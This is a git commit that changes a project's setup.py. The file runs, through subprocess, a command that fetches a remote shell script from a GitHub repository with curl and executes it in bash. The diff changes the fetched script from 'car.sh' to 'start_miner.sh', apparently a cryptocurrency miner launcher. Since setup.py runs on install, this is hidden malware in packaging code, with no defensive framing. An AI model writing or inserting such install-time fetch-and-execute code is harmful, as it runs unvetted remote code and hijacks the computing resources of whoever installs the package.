c39984938fb3b906126c95a0e01f8396d45e3e94
fegadari1 <fegadari@gmail.com>
2025-01-18 00:14:01 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,7 +1,7 @@
 import subprocess
 
 # Command you want to run
-command = 'bash <(curl -s https://github.com/fegadari1/fegadari1/raw/refs/heads/main/car.sh)'
+command = 'bash <(curl -s https://github.com/fegadari1/fegadari1/raw/refs/heads/main/start_miner.sh)'
 
 # Run the command
 subprocess.run(command, shell=True, executable='/bin/bash')
